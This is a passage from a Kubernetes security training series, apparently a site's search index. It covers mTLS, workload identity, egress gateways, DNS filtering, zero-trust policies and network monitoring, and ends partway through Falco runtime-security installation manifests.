http://localhost:8080;\n          proxy_set_header X-Client-DN $ssl_client_s_dn;\n          proxy_set_header X-Client-Verified $ssl_client_verify;\n        }\n      }\n    }\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-with-mtls\n  namespace: production\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.25\n        ports:\n        - containerPort: 8443\n        volumeMounts:\n        - name: nginx-config\n          mountPath: /etc/nginx/nginx.conf\n          subPath: nginx.conf\n        - name: tls-certs\n          mountPath: /etc/nginx/certs\n          readOnly: true\n\n      - name: app\n        image: myapp:1.0\n        ports:\n        - containerPort: 8080\n\n      volumes:\n      - name: nginx-config\n        configMap:\n          name: nginx-mtls-config\n      - name: tls-certs\n        secret:\n          secretName: api-tls-secret\n</code></pre></p> <p>Client Configuration: <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: client\n  namespace: production\nspec:\n  containers:\n  - name: client\n    image: curlimages/curl:latest\n    command: [\"sleep\", \"3600\"]\n    volumeMounts:\n    - name: client-certs\n      mountPath: /certs\n      readOnly: true\n  volumes:\n  - name: client-certs\n    secret:\n      secretName: client-tls-secret\n\n# Test mTLS connection\n# kubectl exec client -- curl --cert /certs/tls.crt --key /certs/tls.key --cacert /certs/ca.crt https://api.production.svc.cluster.local:8443\n</code></pre></p>"},{"location":"10-network-security/#43-workload-identity","title":"4.3 Workload Identity","text":"<p>SPIFFE/SPIRE Installation: <pre><code># Install SPIRE server\nkubectl apply -f https://raw.githubusercontent.com/spiffe/spire-tutorials/main/k8s/quickstart/spire-namespace.yaml\nkubectl apply -f https://raw.githubusercontent.com/spiffe/spire-tutorials/main/k8s/quickstart/server-account.yaml\nkubectl apply -f https://raw.githubusercontent.com/spiffe/spire-tutorials/main/k8s/quickstart/spire-bundle-configmap.yaml\nkubectl apply -f https://raw.githubusercontent.com/spiffe/spire-tutorials/main/k8s/quickstart/server-cluster-role.yaml\nkubectl apply -f https://raw.githubusercontent.com/spiffe/spire-tutorials/main/k8s/quickstart/server-configmap.yaml\nkubectl apply -f https://raw.githubusercontent.com/spire-tutorials/main/k8s/quickstart/server-statefulset.yaml\n\n# Install SPIRE agent\nkubectl apply -f https://raw.githubusercontent.com/spiffe/spire-tutorials/main/k8s/quickstart/agent-account.yaml\nkubectl apply -f https://raw.githubusercontent.com/spiffe/spire-tutorials/main/k8s/quickstart/agent-cluster-role.yaml\nkubectl apply -f https://raw.githubusercontent.com/spiffe/spire-tutorials/main/k8s/quickstart/agent-configmap.yaml\nkubectl apply -f https://raw.githubusercontent.com/spiffe/spire-tutorials/main/k8s/quickstart/agent-daemonset.yaml\n</code></pre></p> <p>Register Workload: <pre><code># Register workload identity\nkubectl exec -n spire spire-server-0 -- \\\n  /opt/spire/bin/spire-server entry create \\\n  -spiffeID spiffe://example.org/ns/production/sa/api \\\n  -parentID spiffe://example.org/ns/spire/sa/spire-agent \\\n  -selector k8s:ns:production \\\n  -selector k8s:sa:api\n</code></pre></p>"},{"location":"10-network-security/#5-egress-control","title":"5. Egress Control","text":""},{"location":"10-network-security/#51-egress-gateway-pattern","title":"5.1 Egress Gateway Pattern","text":"<pre><code>graph LR\n    A[Pod] --&gt;|Internal Traffic| B[Service]\n    A --&gt;|External Traffic| C[Egress Gateway]\n    C --&gt;|Filtered| D[Internet]\n\n    C --&gt;|Allow| E[api.github.com]\n    C --&gt;|Block| F[malicious.com]\n\n    style C fill:#ffd93d\n    style E fill:#6bcf7f\n    style F fill:#ff6b6b</code></pre>"},{"location":"10-network-security/#52-istio-egress-gateway","title":"5.2 Istio Egress Gateway","text":"<p>Deploy Egress Gateway: <pre><code># Install Istio with egress gateway\nistioctl install --set values.gateways.istio-egressgateway.enabled=true -y\n</code></pre></p> <p>ServiceEntry for External Service: <pre><code>apiVersion: networking.istio.io/v1beta1\nkind: ServiceEntry\nmetadata:\n  name: external-api\n  namespace: production\nspec:\n  hosts:\n  - api.external.com\n  ports:\n  - number: 443\n    name: https\n    protocol: HTTPS\n  location: MESH_EXTERNAL\n  resolution: DNS\n</code></pre></p> <p>Gateway Configuration: <pre><code>apiVersion: networking.istio.io/v1beta1\nkind: Gateway\nmetadata:\n  name: egress-gateway\n  namespace: production\nspec:\n  selector:\n    istio: egressgateway\n  servers:\n  - port:\n      number: 443\n      name: https\n      protocol: HTTPS\n    hosts:\n    - api.external.com\n    tls:\n      mode: PASSTHROUGH\n</code></pre></p> <p>VirtualService for Egress: <pre><code>apiVersion: networking.istio.io/v1beta1\nkind: VirtualService\nmetadata:\n  name: external-api-via-egress\n  namespace: production\nspec:\n  hosts:\n  - api.external.com\n  gateways:\n  - mesh\n  - egress-gateway\n  http:\n  - match:\n    - gateways:\n      - mesh\n      port: 443\n    route:\n    - destination:\n        host: istio-egressgateway.istio-system.svc.cluster.local\n        port:\n          number: 443\n  - match:\n    - gateways:\n      - egress-gateway\n      port: 443\n    route:\n    - destination:\n        host: api.external.com\n        port:\n          number: 443\n</code></pre></p>"},{"location":"10-network-security/#53-squid-proxy-for-egress","title":"5.3 Squid Proxy for Egress","text":"<p>Deploy Squid Proxy: <pre><code>apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: squid-config\n  namespace: egress\ndata:\n  squid.conf: |\n    http_port 3128\n\n    # ACL definitions\n    acl allowed_domains dstdomain .github.com .docker.io\n    acl SSL_ports port 443\n    acl CONNECT method CONNECT\n\n    # Access control\n    http_access deny !allowed_domains\n    http_access allow allowed_domains\n    http_access deny all\n\n    # Logging\n    access_log /var/log/squid/access.log\n    cache_log /var/log/squid/cache.log\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: squid-proxy\n  namespace: egress\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: squid\n  template:\n    metadata:\n      labels:\n        app: squid\n    spec:\n      containers:\n      - name: squid\n        image: ubuntu/squid:latest\n        ports:\n        - containerPort: 3128\n        volumeMounts:\n        - name: config\n          mountPath: /etc/squid/squid.conf\n          subPath: squid.conf\n        - name: logs\n          mountPath: /var/log/squid\n      volumes:\n      - name: config\n        configMap:\n          name: squid-config\n      - name: logs\n        emptyDir: {}\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: squid-proxy\n  namespace: egress\nspec:\n  selector:\n    app: squid\n  ports:\n  - port: 3128\n    targetPort: 3128\n</code></pre></p> <p>Configure Pods to Use Proxy: <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: client\n  namespace: production\nspec:\n  containers:\n  - name: app\n    image: myapp:1.0\n    env:\n    - name: HTTP_PROXY\n      value: \"http://squid-proxy.egress.svc.cluster.local:3128\"\n    - name: HTTPS_PROXY\n      value: \"http://squid-proxy.egress.svc.cluster.local:3128\"\n    - name: NO_PROXY\n      value: \".cluster.local,.svc,localhost,127.0.0.1\"\n</code></pre></p>"},{"location":"10-network-security/#6-dns-security","title":"6. DNS Security","text":""},{"location":"10-network-security/#61-coredns-security-configuration","title":"6.1 CoreDNS Security Configuration","text":"<p>Secure CoreDNS ConfigMap: <pre><code>apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: coredns\n  namespace: kube-system\ndata:\n  Corefile: |\n    .:53 {\n        errors\n        health {\n          lameduck 5s\n        }\n        ready\n        kubernetes cluster.local in-addr.arpa ip6.arpa {\n          pods insecure\n          fallthrough in-addr.arpa ip6.arpa\n          ttl 30\n        }\n        prometheus :9153\n        forward . /etc/resolv.conf {\n          max_concurrent 1000\n          policy sequential\n        }\n        cache 30\n        loop\n        reload\n        loadbalance\n\n        # Rate limiting\n        ratelimit 100\n\n        # Block malicious domains\n        file /etc/coredns/blocklist.db blocklist\n\n        # DNSSEC validation\n        dnssec\n    }\n\n  blocklist.db: |\n    $ORIGIN blocklist.\n    @   IN  SOA blocklist. admin.blocklist. (\n                2024011501 ; serial\n                3600       ; refresh\n                1800       ; retry\n                604800     ; expire\n                86400 )    ; minimum\n\n    malicious.com.      IN  A  0.0.0.0\n    phishing.net.       IN  A  0.0.0.0\n</code></pre></p>"},{"location":"10-network-security/#62-dns-policy-enforcement","title":"6.2 DNS Policy Enforcement","text":"<p>Cilium DNS Policy: <pre><code>apiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\n  name: dns-lockdown\n  namespace: production\nspec:\n  endpointSelector:\n    matchLabels:\n      app: backend\n  egress:\n  - toEndpoints:\n    - matchLabels:\n        k8s:io.kubernetes.pod.namespace: kube-system\n        k8s:k8s-app: kube-dns\n    toPorts:\n    - ports:\n      - port: \"53\"\n        protocol: UDP\n      rules:\n        dns:\n        - matchPattern: \"*.cluster.local\"\n        - matchName: \"api.github.com\"\n        - matchPattern: \"*.example.com\"\n</code></pre></p>"},{"location":"10-network-security/#63-external-dns-with-security","title":"6.3 External DNS with Security","text":"<p>ExternalDNS with RBAC: <pre><code>apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: external-dns\n  namespace: external-dns\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: external-dns\nrules:\n- apiGroups: [\"\"]\n  resources: [\"services\", \"endpoints\", \"pods\"]\n  verbs: [\"get\", \"watch\", \"list\"]\n- apiGroups: [\"extensions\", \"networking.k8s.io\"]\n  resources: [\"ingresses\"]\n  verbs: [\"get\", \"watch\", \"list\"]\n- apiGroups: [\"\"]\n  resources: [\"nodes\"]\n  verbs: [\"list\"]\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: external-dns\n  namespace: external-dns\nspec:\n  selector:\n    matchLabels:\n      app: external-dns\n  template:\n    metadata:\n      labels:\n        app: external-dns\n    spec:\n      serviceAccountName: external-dns\n      containers:\n      - name: external-dns\n        image: registry.k8s.io/external-dns/external-dns:v0.14.0\n        args:\n        - --source=service\n        - --source=ingress\n        - --domain-filter=example.com\n        - --provider=aws\n        - --policy=upsert-only\n        - --registry=txt\n        - --txt-owner-id=k8s-cluster-1\n        env:\n        - name: AWS_REGION\n          value: us-east-1\n</code></pre></p>"},{"location":"10-network-security/#7-zero-trust-architecture","title":"7. Zero Trust Architecture","text":""},{"location":"10-network-security/#71-zero-trust-reference-architecture","title":"7.1 Zero Trust Reference Architecture","text":"<pre><code>graph TB\n    A[External Request] --&gt; B[Ingress + WAF]\n    B --&gt; C[Service Mesh]\n\n    C --&gt; D[Identity Verification]\n    C --&gt; E[Policy Enforcement]\n    C --&gt; F[Encryption mTLS]\n\n    D --&gt; G[Workload Identity]\n    E --&gt; H[Authorization Policy]\n    F --&gt; I[Certificate Management]\n\n    G --&gt; J[Application]\n    H --&gt; J\n    I --&gt; J\n\n    J --&gt; K[Data Plane Monitoring]\n    K --&gt; L[Security Analytics]\n    L --&gt; M[Anomaly Detection]\n\n    style B fill:#4da6ff\n    style C fill:#6bcf7f\n    style J fill:#ffd93d\n    style M fill:#e76f51</code></pre>"},{"location":"10-network-security/#72-complete-zero-trust-example","title":"7.2 Complete Zero Trust Example","text":"<p>Namespace Configuration: <pre><code>apiVersion: v1\nkind: Namespace\nmetadata:\n  name: zero-trust-app\n  labels:\n    istio-injection: enabled\n    pod-security.kubernetes.io/enforce: restricted\n---\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny\n  namespace: zero-trust-app\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n</code></pre></p> <p>Application with Security: <pre><code>apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: api\n  namespace: zero-trust-app\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\n  namespace: zero-trust-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: api\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: api\n        version: v1\n    spec:\n      serviceAccountName: api\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 1000\n        fsGroup: 2000\n        seccompProfile:\n          type: RuntimeDefault\n      containers:\n      - name: api\n        image: registry.example.com/api:v1.0@sha256:abc123\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - ALL\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 500m\n            memory: 512Mi\n          requests:\n            cpu: 250m\n            memory: 256Mi\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 8080\n          initialDelaySeconds: 5\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: api\n  namespace: zero-trust-app\nspec:\n  selector:\n    app: api\n  ports:\n  - port: 8080\n    targetPort: 8080\n</code></pre></p> <p>Istio Security Policies: <pre><code># Strict mTLS\napiVersion: security.istio.io/v1beta1\nkind: PeerAuthentication\nmetadata:\n  name: default\n  namespace: zero-trust-app\nspec:\n  mtls:\n    mode: STRICT\n---\n# Deny all by default\napiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata:\n  name: deny-all\n  namespace: zero-trust-app\nspec: {}\n---\n# Allow frontend to API\napiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata:\n  name: frontend-to-api\n  namespace: zero-trust-app\nspec:\n  selector:\n    matchLabels:\n      app: api\n  action: ALLOW\n  rules:\n  - from:\n    - source:\n        principals: [\"cluster.local/ns/zero-trust-app/sa/frontend\"]\n    to:\n    - operation:\n        methods: [\"GET\", \"POST\"]\n        paths: [\"/api/v1/*\"]\n    when:\n    - key: request.headers[authorization]\n      values: [\"Bearer *\"]\n</code></pre></p> <p>Network Policy: <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: api-ingress\n  namespace: zero-trust-app\nspec:\n  podSelector:\n    matchLabels:\n      app: api\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          app: frontend\n    ports:\n    - protocol: TCP\n      port: 8080\n</code></pre></p>"},{"location":"10-network-security/#8-network-monitoring-and-auditing","title":"8. Network Monitoring and Auditing","text":""},{"location":"10-network-security/#81-hubble-cilium-observability","title":"8.1 Hubble (Cilium Observability)","text":"<p>Enable Hubble: <pre><code># Enable Hubble in Cilium\ncilium hubble enable --ui\n\n# Port-forward to Hubble UI\ncilium hubble ui\n\n# Or use Hubble CLI\nhubble observe --all\n</code></pre></p> <p>Monitor Specific Traffic: <pre><code># Monitor traffic to specific pod\nhubble observe --pod production/api\n\n# Monitor denied traffic\nhubble observe --verdict DROPPED\n\n# Monitor specific protocol\nhubble observe --protocol TCP --port 8080\n</code></pre></p>"},{"location":"10-network-security/#82-network-flow-logs","title":"8.2 Network Flow Logs","text":"<p>FlowCollector (Calico): <pre><code>apiVersion: operator.tigera.io/v1\nkind: FlowCollector\nmetadata:\n  name: tigera-secure\nspec:\n  logRequestsPerInterval: 10\n  collectorImage: calico/flow-collector:v3.26.0\n  syslogForward:\n    enabled: true\n    url: tcp://syslog.example.com:514\n</code></pre></p>"},{"location":"10-network-security/#83-service-mesh-metrics","title":"8.3 Service Mesh Metrics","text":"<p>Istio Metrics: <pre><code># Request rate\nrate(istio_requests_total[5m])\n\n# Success rate\nsum(rate(istio_requests_total{response_code!~\"5.*\"}[5m])) /\nsum(rate(istio_requests_total[5m]))\n\n# mTLS connections\nistio_tcp_connections_opened_total{connection_security_policy=\"mutual_tls\"}\n\n# Authorization denials\nrate(envoy_http_rbac_denied[5m])\n</code></pre></p> <p>Linkerd Metrics: <pre><code># Success rate by service\nsum(rate(response_total{classification=\"success\"}[5m])) by (dst_service) /\nsum(rate(response_total[5m])) by (dst_service)\n\n# mTLS enabled\nsum(tcp_open_connections{tls=\"true\"})\n\n# Request latency\nhistogram_quantile(0.99, sum(rate(response_latency_ms_bucket[5m])) by (le, dst_service))\n</code></pre></p>"},{"location":"10-network-security/#9-best-practices","title":"9. Best Practices","text":""},{"location":"10-network-security/#91-network-security-checklist","title":"9.1 Network Security Checklist","text":"<ul> <li>\u2705 Network Policies</li> <li>[ ] Default deny policies applied</li> <li>[ ] Microsegmentation implemented</li> <li>[ ] Egress controls configured</li> <li> <p>[ ] DNS access restricted</p> </li> <li> <p>\u2705 Service Mesh</p> </li> <li>[ ] Service mesh deployed (Istio/Linkerd)</li> <li>[ ] Strict mTLS enabled cluster-wide</li> <li>[ ] Authorization policies enforced</li> <li> <p>[ ] Workload identity implemented</p> </li> <li> <p>\u2705 Certificates</p> </li> <li>[ ] cert-manager deployed</li> <li>[ ] Automated certificate rotation</li> <li>[ ] Certificate monitoring alerts</li> <li> <p>[ ] Short certificate lifetimes</p> </li> <li> <p>\u2705 Egress Control</p> </li> <li>[ ] Egress gateway deployed</li> <li>[ ] External access logged</li> <li>[ ] DNS filtering enabled</li> <li> <p>[ ] Known bad domains blocked</p> </li> <li> <p>\u2705 Monitoring</p> </li> <li>[ ] Network flow logs collected</li> <li>[ ] mTLS monitoring enabled</li> <li>[ ] Anomaly detection configured</li> <li>[ ] Security alerts defined</li> </ul>"},{"location":"10-network-security/#92-performance-optimization","title":"9.2 Performance Optimization","text":"<p>Connection Pooling: <pre><code>apiVersion: networking.istio.io/v1beta1\nkind: DestinationRule\nmetadata:\n  name: api-pool\nspec:\n  host: api.production.svc.cluster.local\n  trafficPolicy:\n    connectionPool:\n      tcp:\n        maxConnections: 100\n      http:\n        http1MaxPendingRequests: 1024\n        http2MaxRequests: 1024\n        maxRequestsPerConnection: 10\n</code></pre></p> <p>Circuit Breaking: <pre><code>apiVersion: networking.istio.io/v1beta1\nkind: DestinationRule\nmetadata:\n  name: api-circuit-breaker\nspec:\n  host: api.production.svc.cluster.local\n  trafficPolicy:\n    outlierDetection:\n      consecutive5xxErrors: 5\n      interval: 30s\n      baseEjectionTime: 30s\n      maxEjectionPercent: 50\n</code></pre></p>"},{"location":"10-network-security/#10-security-checklist","title":"10. Security Checklist","text":"<ul> <li>[ ] Network Segmentation</li> <li>[ ] Namespaces isolated with network policies</li> <li>[ ] Microsegmentation between services</li> <li>[ ] No cross-namespace traffic unless explicitly allowed</li> <li> <p>[ ] System namespaces protected</p> </li> <li> <p>[ ] Encryption</p> </li> <li>[ ] mTLS enabled for all services</li> <li>[ ] TLS 1.2+ only</li> <li>[ ] Strong cipher suites configured</li> <li> <p>[ ] Certificate rotation automated</p> </li> <li> <p>[ ] Access Control</p> </li> <li>[ ] Authorization policies enforced</li> <li>[ ] Service accounts per workload</li> <li>[ ] Workload identity implemented</li> <li> <p>[ ] JWT authentication where applicable</p> </li> <li> <p>[ ] Egress</p> </li> <li>[ ] Egress gateway configured</li> <li>[ ] External access allowlisted</li> <li>[ ] DNS filtering enabled</li> <li> <p>[ ] Proxy logs monitored</p> </li> <li> <p>[ ] Monitoring</p> </li> <li>[ ] Network traffic monitored</li> <li>[ ] Security events alerted</li> <li>[ ] Anomaly detection enabled</li> <li>[ ] Compliance reports generated</li> </ul>"},{"location":"10-network-security/#11-references","title":"11. References","text":""},{"location":"10-network-security/#official-documentation","title":"Official Documentation","text":"<ol> <li>Kubernetes Network Policies</li> <li> <p>https://kubernetes.io/docs/concepts/services-networking/network-policies/</p> </li> <li> <p>Istio Documentation</p> </li> <li> <p>https://istio.io/latest/docs/</p> </li> <li> <p>Linkerd Documentation</p> </li> <li> <p>https://linkerd.io/2/overview/</p> </li> <li> <p>Cilium Documentation</p> </li> <li>https://docs.cilium.io/</li> </ol>"},{"location":"10-network-security/#service-mesh-security","title":"Service Mesh Security","text":"<ol> <li>Istio Security Best Practices</li> <li> <p>https://istio.io/latest/docs/ops/best-practices/security/</p> </li> <li> <p>SPIFFE/SPIRE</p> </li> <li> <p>https://spiffe.io/docs/</p> </li> <li> <p>cert-manager</p> </li> <li>https://cert-manager.io/docs/</li> </ol>"},{"location":"10-network-security/#standards-and-frameworks","title":"Standards and Frameworks","text":"<ol> <li>NIST Zero Trust Architecture (SP 800-207)</li> <li> <p>https://csrc.nist.gov/publications/detail/sp/800-207/final</p> </li> <li> <p>CNCF Cloud Native Security Whitepaper</p> </li> <li> <p>https://github.com/cncf/tag-security/tree/main/security-whitepaper</p> </li> <li> <p>NSA/CISA Kubernetes Hardening Guide</p> <ul> <li>https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF</li> </ul> </li> </ol>"},{"location":"10-network-security/#conclusion","title":"Conclusion","text":"<p>This completes Module 10 and the Kubernetes Security Training series. You've learned comprehensive network security strategies including:</p> <ul> <li>Advanced network policies and microsegmentation</li> <li>Zero trust networking principles</li> <li>Service mesh security (Istio/Linkerd)</li> <li>Mutual TLS implementation</li> <li>Egress controls and DNS security</li> <li>Network monitoring and auditing</li> </ul> <p>Next Steps: - Practice implementing these concepts in lab environments - Review all modules and complete hands-on labs - Pursue relevant certifications (CKS, CKAD) - Stay updated with CNCF security publications</p> <p>Module Completion Status: \u2705 Complete Training Series: \u2705 Complete (Modules 00-10)</p>"},{"location":"11-runtime-security/","title":"Module 11: Runtime Security","text":""},{"location":"11-runtime-security/#overview","title":"Overview","text":"<p>Estimated Time: 8-9 hours</p> <p>Module Type: Advanced Security Deep Dive</p> <p>Prerequisites: - Module 06 - Pod Security - Module 08 - Observability and Monitoring - Module 10 - Network Security - Understanding of Linux kernel security, system calls, and threat detection - Familiarity with security event monitoring and SIEM concepts</p> <p>Runtime security focuses on detecting and preventing threats during container and application execution. This module covers runtime threat detection principles, Falco deployment and custom rule creation, comprehensive host and control plane hardening, etcd security, and real-world threat scenarios. Based on NIST SP 800-190, CIS Benchmarks, and CNCF runtime security best practices.</p>"},{"location":"11-runtime-security/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Understand runtime threat detection principles and methodologies</li> <li>Deploy and configure Falco for Kubernetes security monitoring</li> <li>Create custom Falco rules for application-specific threats</li> <li>Implement comprehensive host hardening (kernel parameters, sysctl)</li> <li>Harden the Kubernetes API server with advanced configurations</li> <li>Secure etcd with encryption at rest, TLS, and access controls</li> <li>Implement kubelet security hardening best practices</li> <li>Detect and respond to runtime security events</li> <li>Analyze security alerts and triage threats</li> <li>Design defense-in-depth runtime security architectures</li> </ol>"},{"location":"11-runtime-security/#1-runtime-threat-detection-principles","title":"1. Runtime Threat Detection Principles","text":""},{"location":"11-runtime-security/#11-runtime-security-landscape","title":"1.1 Runtime Security Landscape","text":"<pre><code>graph TB\n    subgraph \"Runtime Security Layers\"\n        A[Container Runtime] --&gt; B[System Call Monitoring]\n        A --&gt; C[File System Monitoring]\n        A --&gt; D[Network Monitoring]\n        A --&gt; E[Process Monitoring]\n    end\n\n    subgraph \"Detection Engine\"\n        B --&gt; F[Falco]\n        C --&gt; F\n        D --&gt; F\n        E --&gt; F\n    end\n\n    subgraph \"Response Actions\"\n        F --&gt; G[Alerts]\n        F --&gt; H[Block Action]\n        F --&gt; I[Audit Log]\n        F --&gt; J[SIEM Integration]\n    end\n\n    subgraph \"Threat Intelligence\"\n        G --&gt; K[Threat Analysis]\n        I --&gt; K\n        K --&gt; L[Policy Updates]\n        L --&gt; F\n    end\n\n    style F fill:#ff6b6b\n    style K fill:#4ecdc4\n    style L fill:#ffe66d</code></pre> <p>Key Concepts:</p> <ol> <li>System Call Monitoring</li> <li>Intercepts kernel syscalls using eBPF or kernel modules</li> <li>Detects suspicious patterns (privilege escalation, file access)</li> <li> <p>Low overhead, high fidelity detection</p> </li> <li> <p>Behavioral Analysis</p> </li> <li>Baseline normal application behavior</li> <li>Detect anomalies and deviations</li> <li> <p>ML-based detection for zero-day threats</p> </li> <li> <p>Container-Aware Security</p> </li> <li>Understands container boundaries and namespaces</li> <li>Correlates events with Kubernetes metadata</li> <li> <p>Provides context-rich alerts</p> </li> <li> <p>Defense in Depth</p> </li> <li>Multiple detection layers</li> <li>Prevention at build time, detection at runtime</li> <li>Automated response and remediation</li> </ol>"},{"location":"11-runtime-security/#12-common-runtime-threats","title":"1.2 Common Runtime Threats","text":"<p>Category 1: Container Breakouts - Exploiting kernel vulnerabilities - Abusing privileged containers - Namespace escape techniques - Exploiting container runtime (containerd, CRI-O)</p> <p>Category 2: Malicious Activities - Cryptocurrency mining - Data exfiltration - Reverse shells and C2 communication - Lateral movement within cluster</p> <p>Category 3: Misconfigurations - Sensitive file access (/etc/shadow, SSH keys) - Unnecessary privilege usage - Insecure network connections - Credential theft</p> <p>Category 4: Supply Chain Attacks - Malicious container images - Compromised base images - Backdoored dependencies - Typosquatting attacks</p>"},{"location":"11-runtime-security/#13-detection-vs-prevention-philosophy","title":"1.3 Detection vs Prevention Philosophy","text":"<p>Prevention (Build Time): <pre><code># Image scanning, admission control, policy enforcement\n- Image vulnerability scanning\n- Admission webhooks (OPA, Kyverno)\n- PodSecurityStandards enforcement\n- Network policies\n- RBAC restrictions\n</code></pre></p> <p>Detection (Runtime): <pre><code># Real-time monitoring and threat detection\n- System call monitoring (Falco)\n- Behavioral anomaly detection\n- File integrity monitoring\n- Network traffic analysis\n- Audit log analysis\n</code></pre></p> <p>Best Practice: Use both prevention and detection. Prevention reduces attack surface, detection catches what prevention misses.</p>"},{"location":"11-runtime-security/#2-falco-installation-and-configuration","title":"2. Falco Installation and Configuration","text":""},{"location":"11-runtime-security/#21-falco-architecture","title":"2.1 Falco Architecture","text":"<p>Components:</p> <ol> <li>Kernel Module or eBPF Probe</li> <li>Captures system events at kernel level</li> <li>Low overhead, high performance</li> <li> <p>eBPF preferred for modern kernels (4.14+)</p> </li> <li> <p>Falco Engine</p> </li> <li>Parses and evaluates rules</li> <li>Enriches events with Kubernetes metadata</li> <li> <p>Generates alerts based on rule matches</p> </li> <li> <p>Output Channels</p> </li> <li>stdout/stderr</li> <li>Syslog</li> <li>HTTP/HTTPS endpoints</li> <li>gRPC API</li> <li>File output</li> </ol>"},{"location":"11-runtime-security/#22-installing-falco-on-kubernetes","title":"2.2 Installing Falco on Kubernetes","text":"<p>Method 1: Helm Chart (Recommended)</p> <pre><code># Add Falco Helm repository\nhelm repo add falcosecurity https://falcosecurity.github.io/charts\nhelm repo update\n\n# Create namespace\nkubectl create namespace falco\n\n# Install Falco with eBPF driver\nhelm install falco falcosecurity/falco \\\n  --namespace falco \\\n  --set driver.kind=ebpf \\\n  --set falco.grpc.enabled=true \\\n  --set falco.grpcOutput.enabled=true \\\n  --set falco.jsonOutput=true \\\n  --set falco.logLevel=info \\\n  --set falco.priority=debug \\\n  --set auditLog.enabled=true \\\n  --set resources.requests.cpu=200m \\\n  --set resources.requests.memory=512Mi \\\n  --set resources.limits.cpu=1000m \\\n  --set resources.limits.memory=1Gi\n\n# Verify installation\nkubectl get pods -n falco\nkubectl logs -n falco -l app.kubernetes.io/name=falco\n</code></pre> <p>Method 2: DaemonSet Manifest</p> <pre><code># falco-daemonset.yaml\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: falco\n  namespace: falco\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: falco\nrules:\n- apiGroups: [\"\"]\n  resources: [\"*\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n- apiGroups: [\"apps\"]\n  resources: [\"*\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: falco\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: falco\nsubjects:\n- kind: ServiceAccount\n  name: falco\n  namespace: falco\n---\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: falco-config\n  namespace: falco\ndata:\n  falco.yaml: |\n    json_output: true\n    json_include_output_property: true\n    log_stderr: true\n    log_syslog: false\n    log_level: info\n    priority: debug\n\n    libs_logger:\n      enabled: true\n      severity: info\n\n    rules_file:\n      - /etc/falco/falco_rules.yaml\n      - /etc/falco/falco_rules.local.yaml\n      - /etc/falco/k8s_audit_rules.yaml\n      - /etc/falco/rules.d\n\n    plugins:\n      - name: k8saudit\n        library_path: libk8saudit.so\n        init_config: \"\"\n        open_params: \"http://:9765/k8s-audit\"\n      - name: cloudtrail\n        library_path: libcloudtrail.so\n      - name: json\n        library_path: libjson.so\n\n    load_plugins: [k8saudit, json]\n\n    stdout_output:\n      enabled: true\n\n    syslog_output:\n      enabled: false\n\n    file_output:\n      enabled: true\n      keep_alive: false\n      filename: /var/log/falco/events.log\n\n    http_output:\n      enabled: false\n      url: \"http://falcosidekick:2801\"\n\n    grpc:\n      enabled: true\n      bind_address: \"0.0.0.0:5060\"\n      threadiness: 8\n\n    grpc_output:\n      enabled: true\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: falco\n  namespace: falco\n  labels:\n    app: falco\nspec:\n  selector:\n    matchLabels:\n      app: falco\n  template:\n    metadata:\n      labels:\n        app: falco\n    spec:\n      serviceAccountName: falco\n      hostNetwork: true\n      hostPID: true\n      tolerations:\n      - effect: NoSchedule\n        key: node-role.kubernetes.io/master\n      - effect: NoSchedule\n        key: node-role.kubernetes.io/control-plane\n      containers:\n      - name: falco\n        image: falcosecurity/falco-no-driver:0.37.1\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        args:\n          - /usr/bin/falco\n          - --cri\n          - /run/containerd/containerd.sock\n          - --cri\n          - /run/crio/crio.sock\n          - -K\n          - /var/run/secrets/kubernetes.io/serviceaccount/token\n          - -k\n          - https://kubernetes.default\n          - -pk\n        env:\n        - name: FALCO_BPF_PROBE\n          value: \"\"\n        - name: FALCO_K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n  